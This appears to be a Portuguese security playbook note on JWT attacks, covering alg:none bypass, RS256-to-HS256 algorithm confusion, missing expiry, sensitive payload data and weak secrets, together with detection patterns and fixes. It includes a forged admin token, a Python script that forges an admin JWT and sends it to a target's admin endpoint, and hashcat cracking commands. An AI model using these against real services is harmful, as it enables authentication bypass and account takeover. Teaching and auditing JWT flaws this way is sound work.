# JWT  Algorithm Confusion & Ataques

**Tags:** #alto #jwt #autenticacao #token #algorithm-confusion
**OWASP:** A07:2021  Identification and Authentication Failures
**CVSS Base:** 8.1 (Alto)

---

## 📖 O que é

JSON Web Tokens (JWT) são tokens de autenticação stateless. Vulnerabilidades surgem quando o servidor não valida corretamente o algoritmo de assinatura ou aceita tokens manipulados como válidos.

---

## 🔍 `grep_search` Táticas

```
jwt.sign(
jwt.verify(
JWT.decode(
JwtBuilder
decode(token
verify(token
jsonwebtoken
jjwt
PyJWT
jose
```

---

## 💣 Ataques por Categoria

### 1. `alg: none` Bypass

**Como funciona:** alguns servidores aceitam tokens com `alg: none` no header, tratando a assinatura como opcional.

```
Header original: {"alg":"HS256","typ":"JWT"}
Header malicioso: {"alg":"none","typ":"JWT"}

Payload editado: {"sub":"admin","role":"superuser"}
Assinatura: vazia (removida)

Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcnVzZXIifQ.
```

**Detecção estática:** O servidor fixa o algoritmo aceito?
```javascript
//  VULNERÁVEL  aceita alg do próprio token
jwt.verify(token, secret);

//  CORRETO  força o algoritmo
jwt.verify(token, secret, { algorithms: ['HS256'] });
```

---

### 2. RS256  HS256 Downgrade (Algorithm Confusion)

**Como funciona:** se o servidor usa RS256 (assimetrico: assina com chave privada, valida com chave pública), um atacante pega a chave **pública** (frequentemente disponível) e assina um token forjado com HMAC usando ela como segredo.

```
Condição: servidor aceita HS256 mesmo quando configurado para RS256
Ataque: assinar token com HMAC-SHA256 usando a chave pública RSA como segredo
```

```python
# .tmp/jwt_confusion.py
import jwt
import requests

# Chave pública obtida de /api/.well-known/jwks.json ou /.well-known/openid-configuration
public_key = open("public.pem").read()

# Forjar token como admin usando a chave pública como secret HMAC
forged = jwt.encode(
    {"sub": "1337", "role": "admin"},
    public_key,
    algorithm="HS256"
)

r = requests.get("http://target.com/api/admin", headers={"Authorization": f"Bearer {forged}"})
print(r.status_code, r.text[:200])
```

---

### 3. `exp` Ausente ou Expiração Excessiva

```python
#  VULNERÁVEL  sem expiração
token = jwt.encode({"sub": user_id, "role": "admin"}, secret)

#  CORRETO  expiração curta
from datetime import datetime, timedelta, timezone
token = jwt.encode({
    "sub": user_id,
    "exp": datetime.now(timezone.utc) + timedelta(hours=1)
}, secret, algorithm="HS256")
```

---

### 4. Dados Sensíveis no Payload

> JWT não é criptografado por padrão  apenas assinado. O payload é Base64-decodificável por qualquer pessoa.

```bash
# Decodificar payload sem ferramentas especiais
echo "eyJzdWIiOiIxMjM0IiwicGFzc3dvcmQiOiJzZWNyZXQifQ==" | base64 -d
#  {"sub":"1234","password":"secret"}    EXPOSTO
```

**Detecção:** verificar se campos como `password`, `credit_card`, `ssn`, `private_key` estão em claims.

---

### 5. Chave Fraca (Brute Force Offline)

Se o algoritmo é HS256 com segredo fraco, o token pode ser quebrado offline:

```bash
# Usando hashcat
hashcat -a 0 -m 16500 eyJ...token...Here /usr/share/wordlists/rockyou.txt

# Usando jwt-cracker
jwt-cracker eyJ...token...Here wordlist.txt
```

---

## 🛠️ Script de Análise de JWT

```python
# .tmp/analyze_jwt.py
import base64, json, sys

def decode_part(part):
    # Padding fix
    padded = part + '=' * (4 - len(part) % 4)
    return json.loads(base64.b64decode(padded))

token = sys.argv[1] if len(sys.argv) > 1 else input("Token JWT: ")
parts = token.split('.')

if len(parts) != 3:
    print("[WARN] Token malformado ou sem assinatura (alg:none?)")
else:
    header = decode_part(parts[0])
    payload = decode_part(parts[1])
    sig_len = len(parts[2])
    
    print(f"\n📋 HEADER: {json.dumps(header, indent=2)}")
    print(f"\n📦 PAYLOAD: {json.dumps(payload, indent=2)}")
    print(f"\n🔑 Assinatura presente: {'SIM' if sig_len > 0 else '🚨 NÃO (alg:none candidato!)'}")
    
    # Alertas
    if header.get('alg') == 'none':
        print("\n🚨 CRÍTICO: alg=none detectado!")
    if 'exp' not in payload:
        print("\n️  ALTO: sem campo exp  token não expira!")
    if 'password' in payload or 'secret' in payload:
        print("\n️  MÉDIO: dados sensíveis no payload!")
```

---

## 🛡️ Correção

```javascript
//  Node.js  validação segura
const jwt = require('jsonwebtoken');

// Fixar algoritmo, verificar emissor e audiência
const payload = jwt.verify(token, process.env.JWT_SECRET, {
  algorithms: ['HS256'],
  issuer: 'myapp.com',
  audience: 'myapp-users'
});
```

```python
#  Python  PyJWT seguro
import jwt
payload = jwt.decode(
    token,
    secret,
    algorithms=["HS256"],    #  lista explícita, nunca omitir
    options={"require": ["exp", "iat", "sub"]}
)
```

---

## 🔗 Chain Exploits

```
JWT Algorithm Confusion  Admin Takeover total
JWT sem exp + XSS  Token roubado tem validade infinita
JWT payload com dados sensíveis + MITM  Exposição de credenciais
```

---

## 📌 Referências
- [[oauth-2.0-saml-ataques-de-protocolo]]
- [[autenticacao-gestao-de-sessao]]
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
